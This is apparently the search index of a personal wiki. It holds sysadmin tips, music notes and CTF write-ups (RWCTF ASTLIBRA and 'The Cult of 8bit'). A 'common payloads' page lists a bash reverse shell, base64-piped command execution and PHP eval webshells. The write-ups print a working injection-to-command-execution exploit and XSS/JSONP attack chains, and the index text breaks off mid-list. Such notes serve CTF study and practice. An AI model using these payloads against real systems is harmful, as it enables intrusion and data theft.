{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"BRIdGE's wiki","text":"<p>\u8fd8\u5728\u65bd\u5de5</p>"},{"location":"#about","title":"About","text":"<p>\u6700\u8ba8\u538c\u81ea\u6211\u4ecb\u7ecd\u4e86ww\uff0c\u4e0d\u5199\u4e86\u3002</p>"},{"location":"Misc/HTTPS/","title":"HTTPS","text":"<p>Here's how the entire process works:</p> <ol> <li>The client browser and the web server exchange \"hello\" messages.</li> <li>Both parties communicate their encryption standards with each other.</li> <li>The server shares its certificate with the browser.</li> <li>The client verifies the certificate's validity.</li> <li>The client uses the public key to generate a pre-master secret key.</li> <li>This secret key is encrypted using the public key and shared with the server.</li> <li>The client and server compute the symmetric key based on the value of the secret key.</li> <li>Both sides confirm that they have computed the secret key.</li> <li>Data transmission uses symmetric encryption.</li> </ol> <p>One of the most important pieces of information in an SSL certificate is the website's public key. The public key makes encryption and authentication possible. A user's device views the public key and uses it to establish secure encryption keys with the web server. Meanwhile the web server also has a private key that is kept secret; the private key decrypts data encrypted with the public key.</p>"},{"location":"Misc/docker/","title":"docker","text":"<p>docker-compose \u5feb\u901f\u91cd\u642d\u5efa</p> <p><code>docker-compose up -d --no-deps --build</code></p>"},{"location":"Misc/hyper%20V/","title":"\u6253\u5f00/\u5173\u95edhyper V","text":""},{"location":"Misc/hyper%20V/#wsl-docker","title":"\u6253\u5f00 \uff08WSL docker)","text":"<p><code>bcdedit /set hypervisorlaunchtype auto</code></p>"},{"location":"Misc/hyper%20V/#vmware","title":"\u5173\u95ed (VMWARE)","text":"<p>\u53ea\u9700\u8981\u8fd9\u4e2a</p> <p><code>bcdedit /set hypervisorlaunchtype off</code></p> <p>\u4e0b\u9762\u8fd9\u4e2a\u597d\u50cf\u4e0d\u9700\u8981</p> <p><code>Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-Hypervisor</code></p>"},{"location":"Misc/nonebot/","title":"nonebot","text":""},{"location":"Misc/nonebot/#_1","title":"\u6740\u6b7b\u8fdb\u7a0b","text":"<p>\u5bfb\u627e\u8fdb\u7a0b</p> <pre><code>ps -aux | grep go-cqhttp\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u6570\u5b57\u662fpid</p> <p>\u7136\u540e</p> <pre><code>kill -9 pid\n</code></pre> <p>\u6ce8\u610f\u6740nonebot\u7684\u65f6\u5019\u9700\u8981</p> <pre><code>ps -aux | grep python3\n</code></pre> <p>\u7136\u540e\u8fd9\u4e24\u4e2a\u5c31\u662f</p> <pre><code>root      650674  0.0  0.0  17512 11148 ?        S    Dec03   0:00 /usr/bin/python3 -c from multiprocessing.resource_tracker import main;main(4)\nroot      650675  0.3  0.7 546092 116080 ?       Sl   Dec03  13:17 /usr/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork\n</code></pre>"},{"location":"Misc/nonebot/#_2","title":"\u540e\u53f0\u8fd0\u884c","text":"<p>nohup without output</p> <pre><code>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;\n</code></pre> <p>nohup nb run&gt;/dev/null 2&gt;&amp;1 &amp;</p> <p>nohup ./go-cqhttp&gt;/dev/null 2&gt;&amp;1 &amp;</p>"},{"location":"Misc/php_phar/","title":"phar","text":"<pre><code>&lt;?php\n    class TestObject {\n    }\n\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\"); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar\n    $phar-&gt;startBuffering();\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //\u8bbe\u7f6estub\n    $o = new TestObject();\n    $phar-&gt;setMetadata($o); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97\n    $phar-&gt;stopBuffering();\n</code></pre>"},{"location":"Misc/%E5%8F%A4%E5%85%B8%E9%9F%B3%E4%B9%90%E5%B8%B8%E8%A7%81%E6%9B%B2%E5%BC%8F%E5%92%8C%E7%BB%93%E6%9E%84/","title":"\u53e4\u5178\u97f3\u4e50\u5e38\u89c1\u66f2\u5f0f\u548c\u7ed3\u6784","text":"<p>\u594f\u9e23\u66f2 Sonata</p> <p></p> <p>\u4e09\u90e8\u66f2 Ternary Form</p> <p>ABA or ABA'</p> <p>\u4e09\u6bb5\u4f53\u53ef\u4ee5\u518d\u7ec6\u5206\u4e3a\u5355\u4e09\u6bb5\u4f53(simple ternary)\u548c\u590d\u4e09\u6bb5\u4f53(compound ternary)\u3002\u5355\u4e09\u6bb5\u4f53\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90e8\u5206\u90fd\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u4e50\u6bb5\u3002\u800c\u590d\u4e09\u6bb5\u4f53\u4e2d\uff0cA\u6bb5\u548cB\u6bb5\u53ef\u4ee5\u518d\u5206\u62c6\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u4e09\u6bb5\u4f53\uff08\u4ea6\u5bb9\u8bb8\u4e3a\u4e8c\u6bb5\u4f53\uff09\u3002</p> <p>\u56de\u65cb\u66f2 Rondo</p> <p>\u56de\u65cb\u66f2\uff08\u53c8\u8bd1\u8f6e\u821e\u66f2\uff0c\u82f1\u6587\uff1aRondo\uff09\u662f\u4e00\u79cd\u66f2\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u79cd\u97f3\u4e50\u4f53\u88c1\uff0c\u8d77\u6e90\u4e8e\u6b27\u6d32\u6c11\u95f4\u7684\u8f6e\u821e\u6b4c\u66f2\uff0c\u7531\u4e8e\u8fd9\u79cd\u6b4c\u66f2\u5e26\u6709\u4e00\u4e2a\u4e0d\u65ad\u91cd\u8986\u7684\u4e3b\u8981\u65cb\u5f8b\u90e8\u5206\uff0c\u800c\u4e3b\u8981\u65cb\u5f8b\u4e4b\u95f4\u5219\u52a0\u63d2\u5176\u4ed6\u7684\u4e50\u6bb5\uff0c\u79f0\u4e3a\u300c\u63d2\u90e8\u300d\uff0c\u5728\u4e3b\u65cb\u5f8b\u548c\u4e0d\u540c\u63d2\u90e8\u7684\u4ea4\u66ff\u4e0b\uff0c\u5f62\u6210\u4e86\u56de\u65cb\u66f2\u3002\u4e60\u60ef\u4e0a\uff0c\u4e3b\u8981\u90e8\u5206\u60ef\u5e38\u79f0\u4e3aA\uff0c\u63d2\u90e8\u4e3aB\uff0cC\uff0cD\u2026\u2026\u7b49\uff0c\u56e0\u6b64\u56de\u65cb\u66f2\u7684\u7ec4\u6210\u4e3aABACAD\u2026\u2026\u7b49\u3002</p> <p>\u56de\u65cb\u594f\u9e23\u66f2</p> <p></p>"},{"location":"Web%E5%AE%89%E5%85%A8/","title":"Web\u5b89\u5168","text":"<p>\u5b66Web\u6ca1\u524d\u9014\uff0c\u522b\u770b\u4e86</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","title":"HTTP\u8bf7\u6c42\u8d70\u79c1","text":""},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#keep-alive","title":"keep-alive","text":"<p>TCP\u63e1\u624b\u540e\u76f4\u63a5\u53d1\u9001\u8bf7\u6c42\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u63e1\u624b\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#transfer-encoding","title":"Transfer-Encoding","text":"<pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain\nTransfer-Encoding: chunked\n\n7\\r\\n\nMozilla\\r\\n\n11\\r\\n\nDeveloper Network\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre> <p>\u7b2c\u4e00\u884c\u662f16\u8fdb\u5236\uff0c\u672b\u5c3e\u7684<code>\\r\\n</code>\u4e0d\u7b97</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#content-length","title":"Content-Length","text":"<p>body\u7684\u5b57\u8282\u6570\u3002<code>\\r\\n</code>\u4e5f\u7b97</p> <p></p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#_1","title":"\u5404\u79cd\u6a21\u5f0f \u53ef\u4ee5\u53c2\u8003","text":"<p>https://tttang.com/archive/1808</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/","title":"\u5e38\u7528payload","text":""},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#java-exec","title":"java exec","text":"<pre><code>bash -c {echo,xxx}|{base64,-d}|{bash,-i}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#base64","title":"base64 \u547d\u4ee4\u6267\u884c","text":"<pre><code>echo xxx|base64 -d|bash\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#linuxshell","title":"linux\u53cd\u5f39shell","text":"<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1'\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#php","title":"php\u4e00\u53e5\u8bdd\u6728\u9a6c","text":"<pre><code>&lt;?php eval($_GET[\"1\"]); ?&gt;\n\n&lt;?php eval($_POST[\"1\"]); ?&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#suid","title":"SUID\u641c\u7d22","text":"<p><code>find / user root -perm -4000 -print 2&gt;/dev/null</code></p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#r","title":"\u53bb\u6389\\r","text":"<pre><code>tr -d '\\r' &lt; a.sh &gt; b.sh\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#nginx","title":"nginx\u76ee\u5f55","text":"<pre><code>/var/www/html/\n</code></pre> <p>config</p> <pre><code>/etc/nginx/sites-enabled/\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/etc/RWCTF_ASTLIBRA/","title":"RWCTF ASTLIBRA","text":"<p>\u73af\u5883\u548c\u5b98\u65b9wp</p> <p>https://github.com/wupco/rwctf2023-ASTLIBRA</p> <p>\u5f53\u524d\u7aef\u5411/api.php\u53d1\u8d77\u8bf7\u6c42\u7684\u65f6\u5019\uff0capi.php\u6839\u636e\u63a5\u6536\u5230\u7684URL\u53c2\u6570\u548c\u7528\u6237\u540d\u7b49\u4fe1\u606f\uff0c\u62fc\u63a5\u51fa\u4e00\u6bb5\u4ee3\u7801</p> <pre><code>$tmpl = &lt;&lt;&lt;ZEPF\nnamespace {namespace};\n\nclass {class}{\n    public function getURL(){\n        return \"{base64url}\";\n    }\n    public function test(){\n        var ch = curl_init();\n        curl_setopt(ch, CURLOPT_URL, \"{url}\");\n        curl_setopt(ch, CURLOPT_HEADER, 0);\n        curl_exec(ch);\n        curl_close(ch);\n        return true;\n    }\n}\nZEPF;\n</code></pre> <p></p> <p>\u7136\u540e\u5c31\u4f1a\u628a\u8fd9\u6bb5\u4ee3\u7801\u63d2\u5165\u6570\u636e\u5e93\u4e2d\uff0c\u5e76\u6807\u8bb0check=0\uff0c\u5728config.php#wait_for_result\u6b7b\u5faa\u73af\uff0c\u76f4\u5230check=1\u624d\u8df3\u5faa\u73af\u3002</p> <p>\u800cbot.php\u6709\u4e00\u4e2a\u6b7b\u5faa\u73af\u4efb\u52a1\uff0c\u4f1a\u67e5\u627e\u6570\u636e\u5e93\u4e2dcheck=1\u7684\u8bb0\u5f55\uff0c\u5c06\u5176select\u51fa\u6765\uff0c\u7528zephir\u7f16\u8bd1\u8fd0\u884c\u8fd4\u56de\u8bbf\u95eeURL\u7684\u7ed3\u679c\uff0c\u7136\u540e\u628acheck\u6539\u62101\uff0c\u4ece\u800cconfig.php\u8df3\u51fa\u5faa\u73af\u5728api.php\u8fd4\u56de\u7ed3\u679c</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u5728\u6570\u636e\u5e93\u4e2d\u53ef\u4ee5\u770b\u5230</p> <p></p> <p>\u770b\u4e86\u4e00\u4e0b\uff0c\u6ce8\u5165\u70b9\u57fa\u672c\u4e0a\u53ea\u6709URL\u53ef\u63a7\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\u3002\u4f46\u662f\u6700\u540e\u5728\u7f16\u8bd1\u8fd0\u884c\u7684\u65f6\u5019\u4f1a\u5148check\u4e00\u904dURL\u3002</p> <p>url\u4f1a\u7ecf\u8fc7\u5904\u7406</p> <p><code>$url = addslashes($_POST['URL']);</code> </p> <p><code>preg_replace('/(.*)\\{url\\}(.*)/is', '${1}'.$url.'${2}', $zep_file);</code></p> <p>PHP\u6b63\u5219\u8868\u8fbe\u5f0f\u7684<code>${n}</code>\u8868\u793a\u7b2cn\u4e2a\u5c0f\u62ec\u53f7\u8868\u8fbe\u5f0f\u5339\u914d\u51fa\u6765\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u53ef\u4ee5\u5728URL\u672b\u5c3e\u52a0\u4e00\u4e2a${2}\uff0c\u6700\u540e\u6ce8\u91ca\uff0c\u9003\u9038\u5f15\u53f7\u3002code\u5219\u4f1a\u88ab\u63d2\u5165\u5230class\u540e\u9762\u7684\u90e8\u5206\u3002</p> <pre><code>URL=http%3a//www.baidu.com/${2}code/*\n</code></pre> <p>\u5f53\u7136\uff0c\u9884\u671f\u89e3\u7528\u4e86\u4e00\u4e2a\u9006\u5929\u7684PHP\u7279\u6027(?)</p> <p>https://stackoverflow.com/questions/50983530/why-is-preg-replace-removing-backslashes</p> <p>\u4e8e\u662f\u4e5f\u5c31\u6709\u4e86\u5b98\u65b9wp\u4e2d\u7684</p> <p><code>\\\"</code> will finally convert to <code>\\\\\"</code></p> <p>\u9003\u51fa\u6765\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5199\u4ee3\u7801\u4e86\u3002\u6b63\u5e38\u7684php\u7b97\u662f\u5199\u4e0d\u4e86\u4e86\uff0c\u5728bot.php\u91cc\u8fc7\u6ee4\u4e861mol\u4e1c\u897f\u3002\u4f46\u662fzephir\u652f\u6301\u539f\u751fcblock\u3002\u5b98\u65b9wp\u4e2d\u8bf4\u5230</p> <p>Although cblock has been removed by <code>ASTLIBRA/zephir-tunnel/secure.patch</code>, it could still be inserted in the place out of the function scope.</p> <p>\u89c2\u5bdf\u4e00\u4e0b\u6b63\u5e38\u9884\u7f16\u8bd1\u540e\u7684C\u7ed3\u6784</p> <pre><code>#ifdef HAVE_CONFIG_H\n#include \"../ext_config.h\"\n#endif\n\n#include &lt;php.h&gt;\n#include \"../php_ext.h\"\n#include \"../ext.h\"\n\n#include &lt;Zend/zend_operators.h&gt;\n#include &lt;Zend/zend_exceptions.h&gt;\n#include &lt;Zend/zend_interfaces.h&gt;\n\n#include \"kernel/main.h\"\n#include \"kernel/object.h\"\n#include \"kernel/fcall.h\"\n#include \"kernel/memory.h\"\n\n\nZEPHIR_INIT_CLASS(Hack_exp)\n{\nZEPHIR_REGISTER_CLASS(Hack, exp, hack, exp, hack_exp_method_entry, 0);\n\nreturn SUCCESS;\n}\n\nPHP_METHOD(Hack_exp, getURL)\n{\nzval *this_ptr = getThis();\n\n\n\nRETURN_STRING(\"base64\");\n}\n\nPHP_METHOD(Hack_exp, test)\n{\nzval ch, _0, _1, _3;\nzephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;\nzephir_fcall_cache_entry *_2 = NULL;\nzend_long ZEPHIR_LAST_CALL_STATUS;\nzval *this_ptr = getThis();\n\nZVAL_UNDEF(&amp;ch);\nZVAL_UNDEF(&amp;_0);\nZVAL_UNDEF(&amp;_1);\nZVAL_UNDEF(&amp;_3);\n\n\nZEPHIR_MM_GROW();\n\nZEPHIR_CALL_FUNCTION(&amp;ch, \"curl_init\", NULL, 1);\nzephir_check_call_status();\nZVAL_LONG(&amp;_0, 10002);\nZEPHIR_INIT_VAR(&amp;_1);\nZVAL_STRING(&amp;_1, \"localhost\");\nZEPHIR_CALL_FUNCTION(NULL, \"curl_setopt\", &amp;_2, 2, &amp;ch, &amp;_0, &amp;_1);\nzephir_check_call_status();\nZVAL_LONG(&amp;_0, 42);\nZVAL_LONG(&amp;_3, 0);\nZEPHIR_CALL_FUNCTION(NULL, \"curl_setopt\", &amp;_2, 2, &amp;ch, &amp;_0, &amp;_3);\nzephir_check_call_status();\nZEPHIR_CALL_FUNCTION(NULL, \"curl_exec\", NULL, 3, &amp;ch);\nzephir_check_call_status();\nZEPHIR_CALL_FUNCTION(NULL, \"curl_close\", NULL, 4, &amp;ch);\nzephir_check_call_status();\nRETURN_MM_BOOL(1);\n}\n</code></pre> <p>\u7531\u4e8e\u540e\u7eed\u6d41\u7a0b\u4f1a\u8c03\u7528<code>getURL</code>\u51fd\u6570\uff0c\u6240\u4ee5\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u5b8f\u52ab\u6301<code>RETURN_STRING</code>\u6765\u6267\u884c\u547d\u4ee4\u3002</p> <p>\u53e6\u5916\uff0c\u7531\u4e8e\u5f15\u53f7\u4f1a\u88ab<code>addslashes</code>\u5904\u7406\uff0c\u4e0d\u80fd\u76f4\u63a5\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e38\u91cf\u3002\u8fd9\u91cc\u7528\u5230\u4e86\u4e00\u4e9bC\u8bed\u8a00\u51fd\u6570\u5b8f\u7684\u7279\u6027\u3002#s\u4f1a\u76f4\u63a5\u8fd4\u56de\u5b8f\u53d8\u91cf\u540d\u3002</p> <pre><code>%{\n#define CMD echo xxx|base64 -d|bash\n#define GET(cmd) STR(cmd)\n#define STR(s) #s\n#define RETURN_STRING(s) system(GET(CMD))\n}%\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u53cd\u5f39shell\u540e\uff0c\u5199\u4e00\u4e2aphp\u811a\u672c\u8fde\u63a5\u6570\u636e\u5e93\u5c31\u53ef\u4ee5select\u51fa\u6570\u636e\u5e93\u91cc\u7684flag\u4e86\u3002\u6700\u7ec8EXP\uff1a</p> <p>POST /api.php</p> <pre><code>URL=http%3a//www.baidu.com/${2}%25{\n%23define+CMD+echo+xxx|base64+-d|bash\n%23define+GET(cmd)+STR(cmd)\n%23define+STR(s)+%23s\n%23define+RETURN_STRING(s)+system(GET(CMD))\n}%25/*\n</code></pre> <p>\u6267\u884c\u547d\u4ee4</p> <p><code>echo PD9waHAKJGhvc3QgPSAnZGInOwokdXNlcm5hbWUgPSAncm9vdCc7CiRwYXNzd29yZCA9ICdyZWFsd29ybGRjdGYnOwokZGF0YWJhc2UgPSAnd2ViJzsKJGRiYyA9IG15c3FsaV9jb25uZWN0KCRob3N0LCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRhdGFiYXNlKTsKCiRxdWVyeSA9ICJzZWxlY3QgZmxhZyBmcm9tIGZsYWciOwp2YXJfZHVtcCgKICAgICRkYmMgLT4gcXVlcnkoJHF1ZXJ5KS0+ZmV0Y2hfYXNzb2MoKQopOwo=|base64 -d&gt;/tmp/flag.php&amp;&amp;php /tmp/flag.php&amp;&amp;rm /tmp/flag.php</code></p> <p></p> <p>\u53e6\u5916\uff0c\u7531\u4e8ecurl\u5df2\u7ecf\u53ef\u4ee5\u8fbe\u5230SSRF\u8fde\u6570\u636e\u5e93\u7684\u6548\u679c\uff0c\u6240\u4ee5\u4e5f\u4e0d\u4e00\u5b9a\u8981\u547d\u4ee4\u6267\u884c\uff0c\u5229\u7528\u6ca1\u6709\u88abban\u7684php-curl\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fd4\u56deflag\u3002\u5177\u4f53\u53c2\u89c1\u5b98\u65b9wp\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/","title":"RWCTF2023 The Cult of 8bit","text":"<p>\u9898\u76ee\u6a21\u62df\u4e86\u4e00\u4e2a\u535a\u5ba2\u7f51\u7ad9\uff0c\u7528\u6237\u53ef\u4ee5\u6dfb\u52a0post\u548ctodo</p> <p></p> <p>XSS BOT\u53ef\u4ee5\u8bbf\u95ee\u4efb\u610fURL\u3002</p> <p>flag\u5728admin\u53d1\u7684\u4e00\u7bc7post\u91cc\uff0c\u4e5f\u5c31\u662f\u8bf4\u5176id\u4f1a\u5728home\u9875\u9762\u4f1a\u663e\u793a\u3002</p> <p>\u6240\u4ee5\u5e94\u8be5\u901a\u8fc7\u9898\u76ee\u81ea\u5e26\u7684\u4e00\u4e9bXSS\u70b9\uff0c\u5728home\u9875\u9762XSS\u628a\u6570\u636e\u5e26\u51fa\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#home1click-xss","title":"Home\u9875\u97621click XSS","text":"<p>home\u9875\u9762\u7684todo list\u662f\u7528ejs\u6e32\u67d3\u7684\uff0c\u5982\u679ctodo\u662furl\u7684\u8bdd\u4f1a\u6e32\u67d3\u4e3aa\u6807\u7b7e\u3002</p> <p>\u540e\u7aef\u903b\u8f91</p> <pre><code>let isURL = false;\ntry {\nnew URL(text); // errors if not valid URL\nisURL = !text.toLowerCase().trim().startsWith(\"javascript:\"); // no\n} catch {}\n</code></pre> <p>home.ejs</p> <pre><code>&lt;%_ user.todos.forEach(todo =&gt; { _%&gt;\n&lt;%_ if (todo.isURL) { _%&gt;\n&lt;li class=\"has-text-left\"&gt;&lt;a target=\"_blank\" href=&lt;%= todo.text %&gt;&gt;&lt;%= todo.text %&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;%_ } else { _%&gt;\n&lt;li class=\"has-text-left\"&gt;&lt;%= todo.text %&gt;&lt;/li&gt;\n&lt;%_ } _%&gt;\n&lt;%_ }); _%&gt;\n</code></pre> <p>\u5b58\u5728\u5f88\u660e\u663e\u7684\u62fc\u63a5\uff0c\u6784\u9020\u5982\u4e0btodo\u5c31\u80fd1click XSS</p> <p><code>http://127.0.0.1:12345? onclick=alert()</code></p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#postxss","title":"POST\u9875\u9762\u53cd\u5c04\u578bXSS","text":"<p>POST\u9875\u9762\u5b58\u5728\u4e00\u4e2aJSONP\u673a\u5236\u3002</p> <p>\u524d\u7aef\uff1a</p> <pre><code>const POST_SERVER = \"\";\n\nconst $ = document.querySelector.bind(document); // imagine using jQuery...\n\nfunction load_post(post) {\nif (!post.success) {\n$(\"#post-name\").innerText = \"Error\";\n$(\"#post-body\").innerText = post.error;\nreturn;\n}\n\n$(\"#post-name\").innerText = post.name;\n$(\"#post-body\").innerText = post.body;\n}\n\nwindow.onload = function() {\nconst id = new URLSearchParams(window.location.search).get('id');\nif (!id) {\nreturn;\n}\n\n// Load post from POST_SERVER\n// Since POST_SERVER might be a different origin, this also supports loading data through JSONP\nconst request = new XMLHttpRequest();\ntry {\nrequest.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);\nrequest.send(null);\n}\ncatch (err) { // POST_SERVER is on another origin, so let's use JSONP\nlet script = document.createElement(\"script\");\nscript.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;\ndocument.head.appendChild(script);\nreturn;\n}\n\nload_post(JSON.parse(request.responseText));\n}\n</code></pre> <p>\u540e\u7aef</p> <pre><code>router.get(\"/post/:id\", (req, res) =&gt; {\nlet { id } = req.params;\n\nif (!id || typeof id !== \"string\") {\nreturn res.jsonp({\nsuccess: false,\nerror: \"Missing id\"\n});\n}\n\nif (!db.posts.has(id)) {\nreturn res.jsonp({\nsuccess: false,\nerror: \"No post found with that id\"\n});\n}\n\nlet post = db.posts.get(id);\nreturn res.jsonp({\nsuccess: true,\nname: post.name,\nbody: post.body\n});\n});\n</code></pre> <p>\u7531\u4e8eJSONP\u7684\u673a\u5236\uff0c\u540e\u7aef\u4f1a\u53d6\u51facallback\u53c2\u6570\uff0c\u62fc\u63a5\u51fajs\u4ee3\u7801\u8fd4\u56de\u7ed9\u524d\u7aef\u3002\u6548\u679c\u5982\u4e0b</p> <p></p> <p>\u5f53URL\u4e3a</p> <p><code>http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5? callback=alert%23%00</code></p> <p>\u7684\u65f6\u5019\uff0c\u7531\u4e8eURL\u5305\u542b<code>%00</code>\u4f1a\u8fdb\u5165catch\uff0c\u7136\u540e<code>%23</code>\u4e3a<code>#</code>\uff0c\u540e\u9762\u7684callback\u4f1a\u88ab\u5f53\u4f5canchor\u89e3\u6790\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63a7\u5236\u4efb\u610fcallback\u4e86\u3002\u6ce8\u610f\u8fd9\u91cc\u53c2\u6570\u662f\u4e0d\u53ef\u63a7\u7684\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#some-attack","title":"SOME ATTACK","text":"<p>\u8fd9\u91cc\u8981\u4ecb\u7ecd\u672c\u9898\u7528\u5230\u7684\u91cd\u8981\u65b9\u6cd5--SOME ATTACK\u3002</p> <p>https://www.someattack.com/Playground/About</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5982\u679c\u9875\u9762a\u548c\u9875\u9762b\u540c\u6e90\uff0cb\u5b58\u5728xss\uff0c\u53d7\u5bb3\u8005\u8bbf\u95ee\u6076\u610f\u7684c\u7f51\u7ad9\uff0c\u90a3\u4e48\u5c31\u80fd\u5728a\u9875\u9762xss\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#solution1-cookiestoredelete","title":"Solution1: cookieStore.delete","text":"<p>Home\u9875\u9762\u7684click\u53ef\u4ee5\u901a\u8fc7POST\u9875\u9762\u8bbe\u7f6ecallback\u4e3a<code>opener.document.links[4].click</code>\u5b8c\u6210\u70b9\u51fb\u3002\u6240\u4ee5\u9700\u8981\u8ba9BOT\u767b\u5f55\u6211\u4eec\u81ea\u5df1\u7684\u8d26\u53f7\uff0c\u8fd9\u4e2a\u8d26\u53f7\u5305\u542b\u4e00\u4e2aXSS todo\u3002\u4f46\u662f\u8fd9\u5c31\u6d89\u53ca\u5230\u9898\u76ee\u8bbe\u7f6e\u7684<code>csrf</code>\u673a\u5236\u3002\u5ba1\u8ba1\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0\u767b\u5f55\u767b\u51fa\u7b49\u64cd\u4f5c\u9700\u8981\u4f1a\u6839\u636e\u6bd4\u8f83cookie\u7684<code>_csrf</code>\u548c\u8bf7\u6c42\u53c2\u6570<code>_csrf</code>\u6bd4\u8f83\u3002\u5f53cookie\u91cc<code>_csrf</code>\u4e3a\u7a7a\u7684\u65f6\u5019\u8bf7\u6c42\u53c2\u6570<code>_csrf</code>\u4e3a\u7a7a\u7684\u8bdd\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u673a\u5236\u3002</p> <p><code>cookieStore.delete</code>\u51fd\u6570\u521a\u597d\u53ef\u4ee5\u5728POST\u9875\u9762\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u5176\u6b63\u597d\u6709\u4e00\u4e2a\u53c2\u6570<code>name</code></p> <pre><code>name\n</code></pre> <p>A string with the name of a cookie.</p> <p>\u800cname\u5c31\u662f\u53ef\u63a7\u7684\u7528\u6237\u540d\u3002</p> <p>\u8be5\u89e3\u6cd5\u5927\u81f4\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>BOT\u8bbf\u95ee\u53ef\u63a7\u7684a.html</li> <li>a.html\u63a7\u5236\u8df3\u8f6c\u5230admin home\uff0c\u7136\u540e\u6253\u5f00\u65b0\u7a97\u53e3b.html</li> <li> <p>b.html\u9700\u8981\u505a\u7684\u4e8b\u60c5\uff1a</p> <p>\u200b   3.1 cookieStore.delete\u5220\u9664_csrf</p> <p>\u200b   3.2 logout</p> <p>\u200b   3.3 